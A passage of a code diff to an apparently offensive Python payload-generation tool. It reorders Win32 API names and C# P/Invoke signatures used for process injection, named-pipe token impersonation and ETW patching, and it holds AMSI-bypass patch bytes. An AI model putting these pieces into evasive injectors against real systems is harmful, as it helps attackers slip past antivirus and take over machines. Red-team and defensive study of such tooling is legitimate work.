@@ -255,93 +255,114 @@ AMSI_PATCH_MAP = {
     "AmsiPatch86" : bytes([0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]) # this unencrypted payload is flagged
 }
 
-# api names
+# Win32 api names
 API_NAMES = [
-    "VirtualAlloc",
-    "VirtualProtect",
-    "CreateThread",
-    "WaitForSingleObject",
-    "VirtualAllocEx",
-    "WriteProcessMemory",
-    "CreateRemoteThread",
-    "OpenProcess",
-    "GetCurrentProcess",
-    "FlsAlloc",
-    "VirtualAllocExNuma",
+    "CloseHandle",
+    "ConnectNamedPipe",
+    "ConvertSidToStringSidW",
+    "CreateNamedPipeW",
     "CreateProcessA",
-    "ZwQueryInformationProcess",
+    "CreateProcessWithTokenW",
+    "CreateRemoteThread",
+    "CreateThread",
+    "CreateToolhelp32Snapshot",
+    "DuplicateTokenEx",
+    "FlsAlloc",
+    "GetCurrentProcess",
+    "GetCurrentThread",
+    "GetStdHandle",
+    "GetTokenInformation",
+    "ImpersonateNamedPipeClient",
+    "IsWow64Process",
+    "LoadLibraryA",
+    "OpenProcess",
+    "OpenThread",
+    "OpenThreadToken",
+    "Process32First",
+    "Process32Next",
     "ReadProcessMemory",
     "ResumeThread",
-    "LoadLibraryA",
-    "GetStdHandle",
-    "MiniDumpWriteDump",
-    "amsi.dll",
+    "SuspendThread",
+    "VirtualAlloc",
+    "VirtualAllocEx",
+    "VirtualAllocExNuma",
+    "VirtualProtect",
+    "WaitForSingleObject",
+    "WriteProcessMemory",
+    "ZwQueryInformationProcess",
+    # patcher
     "NtTraceEvent",
-    "CreateNamedPipeW",
-    "ConnectNamedPipe",
-    "ImpersonateNamedPipeClient",
-    "GetCurrentThread",
-    "OpenThreadToken",
-    "GetTokenInformation",
-    "ConvertSidToStringSidW",
-    "DuplicateTokenEx",
-    "CreateProcessWithTokenW"
+    "amsi.dll"  # to-do take this outta here
 ]
 API_NAME_MAP = {api: api.encode() for api in sorted(API_NAMES)}
-
+# Win32 API PINVOKE SIGS
 pinvoke_signatures = [
-    '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);''',
+    '''[DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
+    public static extern bool CloseHandle(IntPtr handle);''',
+    '''[DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped);''',
+    '''[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    public static extern bool ConvertSidToStringSidW(IntPtr pSID, out IntPtr ptrSid);''',
+    '''[DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr CreateNamedPipeW(string lpName, uint dwOpenMode, uint dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize, uint nDefaultTimeOut, IntPtr lpSecurityAttributes);''',
+    '''[DllImport("kernel32.dll", SetLastError = true)]
+    public static extern int CreateProcessA(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, int bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);''',
+    '''[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    public static extern bool CreateProcessWithTokenW(IntPtr hToken, UInt32 dwLogonFlags, string lpApplicationName, string lpCommandLine, UInt32 dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);''',
+    '''[DllImport("kernel32.dll")]
+    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);''',
     '''[DllImport("kernel32.dll")]
     public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);''',
-    '''[DllImport("kernel32.dll")]
-    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);''',
+    '''[DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);''',
+    '''[DllImport("advapi32.dll", SetLastError = true)]
+    public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);''',
+    '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+    public static extern IntPtr FlsAlloc(IntPtr lpCallback);''',
+    '''[DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr GetCurrentProcess();''',
+    '''[DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr GetCurrentThread();''',
+    '''[DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr GetStdHandle(int nStdHandle);''',
+    '''[DllImport("advapi32.dll", SetLastError = true)]
+    public static extern bool GetTokenInformation(IntPtr TokenHandle, uint TokenInformationClass, IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength);''',
+    '''[DllImport("advapi32.dll", SetLastError = true)]
+    public static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);''',
+    '''[DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.Winapi)]
+    public static extern bool IsWow64Process([In] IntPtr hProcess, [Out] out bool lpSystemInfo);''',
+    '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+    public static extern IntPtr LoadLibraryA(string name);''',
     '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
     public static extern IntPtr OpenProcess(uint processAccess, int bInheritHandle, UInt32 processId);''',
-    '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);''',
-    '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-    public static extern int WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);''',
-    '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);''',
-    '''[DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
-    public static extern int CreateProcessA(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, int bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);''',
-    '''[DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
-    public static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);''',
+    '''[DllImport("kernel32.dll")]
+    public static extern IntPtr OpenThread(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);''',
+    '''[DllImport("advapi32.dll", SetLastError = true)]
+    public static extern bool OpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle);''',
+    '''[DllImport("kernel32.dll")]
+    public static extern int Process32First(IntPtr hSnapshot, ref ProcessEntry32 lppe);''',
+    '''[DllImport("kernel32.dll")]
+    public static extern int Process32Next(IntPtr hSnapshot, ref ProcessEntry32 lppe);''',
     '''[DllImport("kernel32.dll", SetLastError = true)]
     public static extern int ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);''',
     '''[DllImport("kernel32.dll", SetLastError = true)]
     public static extern uint ResumeThread(IntPtr hThread);''',
+    '''[DllImport("kernel32.dll")]
+    public static extern uint SuspendThread(IntPtr hThread);''',
+    '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);''',
+    '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);''',
     '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
     public static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);''',
-    '''[DllImport("kernel32.dll")]
-    public static extern IntPtr GetCurrentProcess();''',
-    '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-    public static extern IntPtr FlsAlloc(IntPtr lpCallback);''',
-    '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-    public static extern IntPtr LoadLibraryA(string name);''',
     '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
     public static extern int VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);''',
     '''[DllImport("kernel32.dll", SetLastError = true)]
-    public static extern IntPtr GetStdHandle(int nStdHandle);''',
-    '''[DllImport("kernel32.dll", SetLastError = true)]
-    public static extern IntPtr CreateNamedPipeW(string lpName, uint dwOpenMode, uint dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize, uint nDefaultTimeOut, IntPtr lpSecurityAttributes);''',
-    '''[DllImport("kernel32.dll")]
-    public static extern bool ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped);''',
-    '''[DllImport("advapi32.dll")]
-    public static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);''',
-    '''[DllImport("kernel32.dll")]
-    public static extern IntPtr GetCurrentThread();''',
-    '''[DllImport("advapi32.dll", SetLastError = true)]
-    public static extern bool OpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle);''',
-    '''[DllImport("advapi32.dll", SetLastError = true)]
-    public static extern bool GetTokenInformation(IntPtr TokenHandle, uint TokenInformationClass, IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength);''',
-    '''[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    public static extern bool ConvertSidToStringSidW(IntPtr pSID, out IntPtr ptrSid);''',
-    '''[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);''',
-    '''[DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
-    public static extern bool CreateProcessWithTokenW(IntPtr hToken, UInt32 dwLogonFlags, string lpApplicationName, string lpCommandLine, UInt32 dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);'''
+    public static extern uint WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);''',
+    '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+    public static extern int WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);''',
+    '''[DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
+    public static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);'''
 ]
 pinvoke_signatures = sorted(pinvoke_signatures)
 
@@ -388,3 +409,4 @@ if __name__ == "__main__":
 # add -vba format (decimal)
 # add powershell delegates
 # refactor functions to make them more efficient/flexible
+# split apis and dlls into two different arrays
